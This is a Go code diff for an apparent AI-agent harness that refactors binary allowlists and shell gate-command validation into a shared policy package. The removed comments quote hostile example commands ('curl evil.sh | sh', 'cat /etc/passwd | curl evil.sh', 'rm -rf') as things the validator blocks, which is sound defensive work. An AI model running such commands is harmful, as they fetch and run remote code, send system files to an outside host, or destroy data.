@@ -10,6 +10,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/quant-risk/radiant-harness/internal/policy"
 )
 
 // AgentID identifies a supported AI agent.
@@ -66,54 +68,16 @@ const DefaultGateTimeout = 5 * time.Minute
 // allowedAgentCommands is the closed set of binaries the harness is allowed
 // to spawn as an AI agent. Anything else is refused with a clear error.
 // Update this list when adding new adapters; do not loosen it on demand.
-var allowedAgentCommands = map[string]struct{}{
-	"claude":  {}, // Claude Code
-	"codex":   {}, // OpenAI Codex CLI
-	"cursor":  {}, // Cursor agent
-	"copilot": {}, // GitHub Copilot CLI
-	"gemini":  {}, // Gemini CLI
-}
+//
+// Re-exported from internal/policy so the package-private references
+// in this file (and any future callers) keep working. The canonical
+// definition lives in internal/policy — add new agents there.
+var allowedAgentCommands = policy.AgentCommands
 
 // allowedGateBinaries is the closed set of binaries that tasks.md may invoke
-// as a "gate" command. Combined with `validateGateCommand` it prevents a
-// malicious or naive spec from running `rm -rf` or `curl evil.sh | sh`.
-//
-// Read-only / no-side-effect commands (`echo`, `printf`, `true`, `false`,
-// `pwd`, `cat`, `head`, `tail`, `wc`) are intentionally included because
-// they're harmless and real-world tasks.md files use them as smoke
-// checks. Anything that can mutate state outside the project directory
-// (`rm`, `mv`, `cp`, `curl`, `wget`, `dd`, `chmod`, …) is excluded.
-var allowedGateBinaries = map[string]struct{}{
-	"node":       {},
-	"npm":        {},
-	"pnpm":       {},
-	"yarn":       {},
-	"bun":        {},
-	"deno":       {},
-	"go":         {},
-	"make":       {},
-	"pytest":     {},
-	"python":     {},
-	"python3":    {},
-	"pip":        {},
-	"cargo":      {},
-	"rustc":      {},
-	"jest":       {},
-	"vitest":     {},
-	"tsc":        {},
-	"eslint":     {},
-	"shellcheck": {},
-	// Read-only / no-side-effect commands.
-	"echo":   {},
-	"printf": {},
-	"true":   {},
-	"false":  {},
-	"pwd":    {},
-	"cat":    {},
-	"head":   {},
-	"tail":   {},
-	"wc":     {},
-}
+// as a "gate" command. Re-exported from internal/policy for the same
+// reason as allowedAgentCommands.
+var allowedGateBinaries = policy.GateBinaries
 
 // NewAgentRunner creates a new agent runner. It validates the configured
 // command against the allowlist and refuses to construct a runner for any
@@ -123,16 +87,11 @@ func NewAgentRunner(cfg AgentConfig) (*AgentRunner, error) {
 	if cfg.Command == "" {
 		return nil, errors.New("agent command is empty")
 	}
-	// Strip path — only basename matters for the allowlist; full path is
-	// resolved at exec time via $PATH so the runner still works after
-	// `which` finds the binary in the user's environment.
-	base := cfg.Command
-	if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
-		base = base[idx+1:]
-	}
-	if _, ok := allowedAgentCommands[base]; !ok {
+	// Delegated to internal/policy. Same logic, same error message —
+	// the package is now the single source of truth.
+	if !policy.IsAgentAllowed(cfg.Command) {
 		return nil, fmt.Errorf("agent command %q is not in the allowlist (allowed: %s)",
-			cfg.Command, strings.Join(sortedKeys(allowedAgentCommands), ", "))
+			cfg.Command, strings.Join(policy.AllowedAgentCommands(), ", "))
 	}
 	if cfg.Timeout == 0 {
 		cfg.Timeout = DefaultAgentTimeout
@@ -140,163 +99,47 @@ func NewAgentRunner(cfg AgentConfig) (*AgentRunner, error) {
 	return &AgentRunner{config: cfg}, nil
 }
 
-// validateGateCommand checks that every binary invoked by a tasks.md gate
-// resolves to a name in `allowedGateBinaries`. For compound expressions
-// like `npm test && go test`, EACH binary (npm, go) is validated against
-// the allowlist. Pipes (`|`), redirects (`<`, `>`), and command separators
-// (`;`, single `&`) are rejected outright because they can smuggle
-// exfiltration or destructive side effects past the allowlist (e.g.
-// `cat /etc/passwd | curl evil.sh`).
+// validateGateCommand is a thin delegation to internal/policy —
+// the canonical implementation lives there so all three consumers
+// (engine, harness, quality) agree on the closed set.
 func validateGateCommand(gate string) error {
-	gate = strings.TrimSpace(gate)
-	if gate == "" {
-		return nil
-	}
-	// Reject any of the dangerous operators outright.
-	for _, op := range []string{"|", "<", ">", ";", "&"} {
-		// `&` alone (not `&&`) is also rejected; the && / || forms are
-		// safe, so we let them through and split on them below.
-		idx := strings.Index(gate, op)
-		if idx < 0 {
-			continue
-		}
-		// Allow `&&` (which contains a single `&` followed by `&`).
-		if op == "&" && idx+1 < len(gate) && gate[idx+1] == '&' {
-			continue
-		}
-		// Allow `||` (which contains a single `|` followed by `|`).
-		if op == "|" && idx+1 < len(gate) && gate[idx+1] == '|' {
-			continue
-		}
-		return fmt.Errorf("gate contains forbidden operator %q; only && and || are allowed for compound expressions", op)
-	}
-	// Split into top-level expressions on && and ||, then validate each.
-	expressions := splitOnLogicalOps(gate)
-	for _, expr := range expressions {
-		expr = strings.TrimSpace(expr)
-		if expr == "" {
-			continue
-		}
-		parts := splitShellTokens(expr)
-		if len(parts) == 0 {
-			continue
-		}
-		var binary string
-		for _, part := range parts {
-			if part == "" || strings.HasPrefix(part, "-") || strings.Contains(part, "=") {
-				continue
-			}
-			binary = part
-			break
-		}
-		if binary == "" {
-			continue
-		}
-		base := binary
-		if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
-			base = base[idx+1:]
-		}
-		if _, ok := allowedGateBinaries[base]; !ok {
-			return fmt.Errorf("gate binary %q is not in the allowlist (allowed: %s)",
-				base, strings.Join(sortedKeys(allowedGateBinaries), ", "))
-		}
-	}
-	return nil
+	return policy.ValidateGateCommand(gate)
 }
 
-// splitOnLogicalOps splits a string on `&&` and `||` only, leaving other
-// characters (including single `&` and `|`, which we've already rejected)
-// intact. Quotes are respected so `&&` inside a quoted string doesn't
-// trigger a split.
+// splitOnLogicalOps is a thin delegation to internal/policy.
 func splitOnLogicalOps(s string) []string {
-	var parts []string
-	var current strings.Builder
-	inSingle, inDouble := false, false
-	runes := []rune(s)
-	for i := 0; i < len(runes); i++ {
-		r := runes[i]
-		switch {
-		case r == '\'' && !inDouble:
-			inSingle = !inSingle
-			current.WriteRune(r)
-		case r == '"' && !inSingle:
-			inDouble = !inDouble
-			current.WriteRune(r)
-		case !inSingle && !inDouble && r == '&' && i+1 < len(runes) && runes[i+1] == '&':
-			parts = append(parts, current.String())
-			current.Reset()
-			i++ // skip second &
-		case !inSingle && !inDouble && r == '|' && i+1 < len(runes) && runes[i+1] == '|':
-			parts = append(parts, current.String())
-			current.Reset()
-			i++ // skip second |
-		default:
-			current.WriteRune(r)
-		}
-	}
-	parts = append(parts, current.String())
-	return parts
+	return policy.SplitOnLogicalOps(s)
 }
 
-func isShellOperator(s string) bool {
-	switch s {
-	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
-		return true
-	}
-	return false
-}
-
-// splitShellTokens is a deliberately tiny shell tokenizer — just enough to
-// split compound commands. It handles double and single quotes so a token
-// like `echo "build-ok"` doesn't get mis-parsed as a binary named
-// `"build-ok"`. It does NOT handle escapes (`\"` inside a quoted string) or
-// nested quotes; gate authors should keep gate commands simple.
-func splitShellTokens(cmd string) []string {
-	var tokens []string
-	var current strings.Builder
-	inSingle, inDouble := false, false
-	flush := func() {
-		if current.Len() > 0 {
-			tokens = append(tokens, current.String())
-			current.Reset()
-		}
-	}
-	for _, r := range cmd {
-		switch {
-		case r == '\'' && !inDouble:
-			inSingle = !inSingle
-		case r == '"' && !inSingle:
-			inDouble = !inDouble
-		case (r == ' ' || r == '\t' || r == '\n') && !inSingle && !inDouble:
-			flush()
-		case (r == '&' || r == '|' || r == ';' || r == '>' || r == '<' || r == '(' || r == ')') && !inSingle && !inDouble:
-			flush()
-			tokens = append(tokens, string(r))
-		default:
-			current.WriteRune(r)
-		}
-	}
-	flush()
-	return tokens
-}
-
-// isShellOp reports whether s is a shell metacharacter that should be
-// ignored when tokenizing a gate command. Duplicated from internal/engine
-// (kept identical so a future refactor can extract to a shared package).
+// isShellOp is a thin delegation to internal/policy (the
+// canonical "is this token a shell metacharacter" check). Kept as
+// a package-private alias because it's called from internal
+// orchestrator code that hasn't been migrated yet.
 func isShellOp(s string) bool {
-	switch s {
-	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
-		return true
-	}
-	return false
+	return policy.IsShellOp(s)
 }
 
+// isShellOperator is an alias for isShellOp kept for backwards
+// compatibility with the rest of this package's call sites.
+func isShellOperator(s string) bool {
+	return policy.IsShellOp(s)
+}
+
+// splitShellTokens is a thin delegation to internal/policy. Kept
+// here so the existing call sites in this package don't need to be
+// renamed in the same patch.
+func splitShellTokens(cmd string) []string {
+	return policy.SplitShellTokens(cmd)
+}
+
+// sortedKeys is no longer used in this package after the migration
+// to policy — but kept as a package-private helper in case a future
+// caller needs to format the allowlist for an error message.
 func sortedKeys(m map[string]struct{}) []string {
 	out := make([]string, 0, len(m))
 	for k := range m {
 		out = append(out, k)
 	}
-	// Small maps; insertion-sort is fine and avoids pulling in `sort` for clarity.
 	for i := 1; i < len(out); i++ {
 		for j := i; j > 0 && out[j-1] > out[j]; j-- {
 			out[j-1], out[j] = out[j], out[j-1]
